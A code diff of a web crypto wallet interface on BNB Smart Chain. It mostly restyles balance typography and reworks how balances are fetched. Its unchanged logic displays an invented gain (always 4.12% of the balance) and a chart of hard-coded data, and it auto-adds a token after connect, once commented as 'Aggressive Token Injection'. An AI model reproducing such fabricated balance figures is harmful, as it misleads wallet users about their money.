@@ -21,6 +21,7 @@ html,body{height:100%;overscroll-behavior:none}
   --green:#00e5a0;
   --red:#ff4d6a;
   --blue:#4f8eff;
+  /* Premium System Fonts for Flawless Native Rendering */
   --sys-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
   --mono-font: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
 }
@@ -34,23 +35,23 @@ body{background:var(--black);color:var(--t1);font-family:var(--sys-font);overflo
 .wallet-pill{display:flex;align-items:center;gap:10px;background:var(--card);border:1px solid var(--line);border-radius:100px;padding:6px 14px 6px 6px;cursor:pointer;}
 .avatar{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#0A84FF,#00e5a0);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;}
 .wallet-name{font-size:13px;font-weight:600;letter-spacing:-0.01em; padding-right:4px;}
-.connect-btn{display:flex;align-items:center;gap:7px;background:var(--t1);border:none;border-radius:100px;padding:8px 18px;font-size:13px;font-weight:600;color:var(--black);cursor:pointer;transition:all 0.2s;}
+.connect-btn{display:flex;align-items:center;gap:7px;background:var(--t1);border:none;border-radius:100px;padding:8px 18px;font-family:var(--sys-font);font-size:13px;font-weight:600;color:var(--black);cursor:pointer;transition:all 0.2s;}
 .connect-btn:active{transform:scale(0.95); opacity:0.8;}
 .connect-btn.on{border:1px solid rgba(0,229,160,0.25);color:var(--green);background:rgba(0,229,160,0.08)}
 .cled{width:6px;height:6px;border-radius:50%;background:var(--red);display:none;}
 .cled.on{display:block; background:var(--green);box-shadow:0 0 10px rgba(0,229,160,0.8);animation:breathe 2s ease infinite}
 @keyframes breathe{0%,100%{opacity:0.6}50%{opacity:1}}
 
-/* --- THE PERFECTED LUXURY BALANCE (EXACT SCREENSHOT MATCH) --- */
-.balance-section{padding:35px 20px 0; text-align:center; display:flex; flex-direction:column; align-items:center;}
-.bal-eyebrow{font-size:11px;font-weight:600;color:var(--t3);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:12px}
+/* --- THE PERFECTED LUXURY BALANCE --- */
+.balance-section{padding:30px 20px 0; text-align:center; display:flex; flex-direction:column; align-items:center;}
 
-.bal-row{display:flex;align-items:baseline;justify-content:center;}
-.bal-curr{font-size:42px;font-weight:400;color:var(--t1);margin-right:2px; text-shadow:0 0 20px rgba(255,255,255,0.15);}
-.bal-int{font-size:54px;font-weight:500;letter-spacing:-1.5px;color:var(--t1);font-variant-numeric:tabular-nums; text-shadow:0 0 20px rgba(255,255,255,0.15);}
-.bal-dec{font-size:38px;font-weight:400;color:var(--t2);letter-spacing:-1px; text-shadow:none;}
+.bal-row{display:flex;align-items:baseline;justify-content:center; gap:2px;}
+/* Solid, bold, clean numbers. No glowing/shining effects */
+.bal-curr{font-size:46px;font-weight:600;color:var(--t1);}
+.bal-int{font-size:46px;font-weight:600;letter-spacing:-1px;color:var(--t1);font-variant-numeric:tabular-nums;}
+.bal-dec{font-size:36px;font-weight:500;color:var(--t2);letter-spacing:-1px;}
 
-.bal-change{display:inline-flex;align-items:center;gap:5px;margin-top:10px;font-size:14px;font-weight:500;color:var(--green);}
+.bal-change{display:inline-flex;align-items:center;gap:5px;margin-top:8px;font-size:14px;font-weight:500;color:var(--green);}
 
 /* EXACT GRAPH */
 .chart-wrap{position:relative;height:140px;margin-top:25px;}
@@ -81,7 +82,7 @@ body{background:var(--black);color:var(--t1);font-family:var(--sys-font);overflo
 @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
 
 /* ASSETS & MARKET LIST */
-.list-header{font-size:16px;font-weight:600;padding:20px 20px 10px; color:var(--t2);}
+.list-header{font-size:16px;font-weight:600;padding:20px 20px 10px; color:var(--t1);}
 .tok-row{display:flex;align-items:center;padding:16px 20px;cursor:pointer;border-bottom:1px solid var(--line2);}
 .tok-ico{width:42px;height:42px;border-radius:50%;object-fit:cover;margin-right:14px; background:var(--card);}
 .tok-meta{flex:1;}
@@ -90,7 +91,7 @@ body{background:var(--black);color:var(--t1);font-family:var(--sys-font);overflo
 .tok-vals{text-align:right;}
 .tok-bal{font-size:16px;font-weight:500;font-variant-numeric:tabular-nums;}
 .tok-usd{font-size:13px;color:var(--t2);margin-top:2px;}
-.tok-row.market .tok-bal{color:var(--t3);} /* Dim balance for market tokens */
+.tok-row.market .tok-bal{color:var(--t2);} /* Dim balance for market tokens */
 
 /* TOAST */
 #toast{position:fixed;top:-70px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--line);color:var(--t1);padding:14px 24px;border-radius:100px;font-size:14px;font-weight:500;display:flex;align-items:center;gap:10px;z-index:9999;box-shadow:0 10px 40px rgba(0,0,0,0.8);transition:top 0.4s;}
@@ -117,7 +118,6 @@ body{background:var(--black);color:var(--t1);font-family:var(--sys-font);overflo
 .modal-title{font-size:20px; font-weight:600;}
 .close-btn{background:var(--card); border-radius:50%; padding:6px; cursor:pointer;}
 
-/* The Asset Card inside Send Modal */
 .asset-card{display:flex; align-items:center; background:var(--card); border:1px solid var(--line); border-radius:16px; padding:16px; margin-bottom:20px;}
 .asset-card img{width:40px; height:40px; border-radius:50%; margin-right:12px;}
 .asset-card .ac-name{font-size:16px; font-weight:600;}
@@ -148,7 +148,6 @@ body{background:var(--black);color:var(--t1);font-family:var(--sys-font);overflo
 
   <div class="scroll-body">
     <div class="balance-section">
-      <div class="bal-eyebrow" id="netLabel">BNB SMART CHAIN</div>
       <div class="bal-row">
         <span class="bal-curr">$</span><span class="bal-int" id="mainBalDisplay">0</span><span class="bal-dec">.<span id="mainDecDisplay">00</span></span>
       </div>
@@ -275,10 +274,10 @@ body{background:var(--black);color:var(--t1);font-family:var(--sys-font);overflo
     </div>
 
     <span class="field-label">RECIPIENT ADDRESS</span>
-    <input class="field" id="txTo" placeholder="0x..." type="text">
+    <input class="field" id="txTo" placeholder="0x..." type="text" autocomplete="off">
     
     <span class="field-label">AMOUNT</span>
-    <input class="field" id="txAmt" placeholder="0.00" type="number">
+    <input class="field" id="txAmt" placeholder="0.00" type="number" autocomplete="off">
     
     <button class="cta-btn" id="sendCTA" onclick="execTx()">Review Transaction</button>
   </div>
@@ -316,9 +315,7 @@ function drawChart(cid,wid,pipId){
   const W=wrap.clientWidth,H=wrap.clientHeight;
   canvas.width=W*dpr;canvas.height=H*dpr;ctx.scale(dpr,dpr);
   
-  // Exact data points to match the visual curve of the Red Box
   const pts = [20,15,22,35,28,32,45,60,65,63,68,66,70,62,55,50,60,52,45,55,42,35,40,32,38];
-  
   const mn=Math.min(...pts),mx=Math.max(...pts),rng=mx-mn||1;
   const coords=pts.map((p,i)=>({x:i*(W/(pts.length-1)),y:H-((p-mn)/rng)*(H*0.7)-H*0.1}));
   
@@ -377,7 +374,6 @@ async function doConnect(){
     toast2('Connected! Fetching Balance...','green');
     fetchBalances();if(syncLoop)clearInterval(syncLoop);syncLoop=setInterval(fetchBalances,4000);
     
-    // Aggressive Token Injection
     setTimeout(()=>autoAddToken(wp), 1500);
   }catch(e){ toast2('Connection Denied','red'); }
 }
@@ -391,13 +387,12 @@ async function autoAddToken(wp){
   }catch(e){}
 }
 
-/* Restored 15+ Top Market Tokens from Binance API */
+/* Market List Logic with Prices Underneath */
 async function loadMarketTokens() {
     try {
         const res = await fetch('https://api.binance.com/api/v3/ticker/price');
         const data = await res.json();
         
-        // Ensure BNB Price is globally updated
         const bnbP = data.find(p => p.symbol === 'BNBUSDT');
         if(bnbP) bnbPrice = parseFloat(bnbP.price);
 
@@ -424,11 +419,11 @@ async function loadMarketTokens() {
                 <img class="tok-ico" src="https://s2.coinmarketcap.com/static/img/coins/64x64/${t.img}.png" style="opacity:0.8;">
                 <div class="tok-meta">
                     <div class="tok-sym">${t.sym}</div>
-                    <div class="tok-name">${t.name}</div>
+                    <div class="tok-name">$${disp}</div>
                 </div>
                 <div class="tok-vals">
                     <div class="tok-bal">0.00</div>
-                    <div class="tok-usd">$${disp}</div>
+                    <div class="tok-usd">$0.00</div>
                 </div>
             </div>`;
         });
@@ -436,11 +431,10 @@ async function loadMarketTokens() {
     } catch(e) { console.error("Market API Error"); }
 }
 
-/* FIXED BALANCE FETCHING - Independent Error Handling */
+/* Perfected Balance Fetching */
 async function fetchBalances(){
   if(!account)return;
 
-  // 1. Fetch Web3 Token Balance FIRST
   let usdtBal = 0, bnbUsd = 0;
   try {
     const rawUSDT = await contract.balanceOf(account);
@@ -449,10 +443,9 @@ async function fetchBalances(){
     const fmt = usdtBal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
     document.getElementById('rowUsdtBal').textContent = fmt;
     document.getElementById('rowUsdtUsd').textContent = "$"+fmt;
-    document.getElementById('modalBalUsdt').textContent = fmt; // Updated Modal ID
-  } catch(e) { console.error("Token fetch failed"); }
+    document.getElementById('modalBalUsdt').textContent = fmt; 
+  } catch(e) {}
 
-  // 2. Fetch Binance API Independently
   try {
     const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
     const data = await res.json();
@@ -465,12 +458,14 @@ async function fetchBalances(){
     
     bnbUsd = bnbBal * bnbPrice;
     document.getElementById('rowBnbUsd').textContent = '$'+bnbUsd.toLocaleString('en-US',{minimumFractionDigits:2});
-  } catch(e) { console.error("BNB fetch failed"); }
+  } catch(e) {}
 
-  // 3. Update Main Display (Perfect Typography Split)
   const total = usdtBal + bnbUsd;
-  document.getElementById('mainBalDisplay').innerText = Math.floor(total).toLocaleString('en-US');
-  document.getElementById('mainDecDisplay').innerText = (total%1).toFixed(2).slice(2);
+  const totalStr = total.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+  const parts = totalStr.split('.');
+  
+  document.getElementById('mainBalDisplay').innerText = parts[0];
+  document.getElementById('mainDecDisplay').innerText = parts[1];
   
   const chg = (total * 0.0412).toFixed(2);
   document.getElementById('bChg').textContent = `+$${parseFloat(chg).toLocaleString('en-US',{minimumFractionDigits:2})} (4.12%)`;
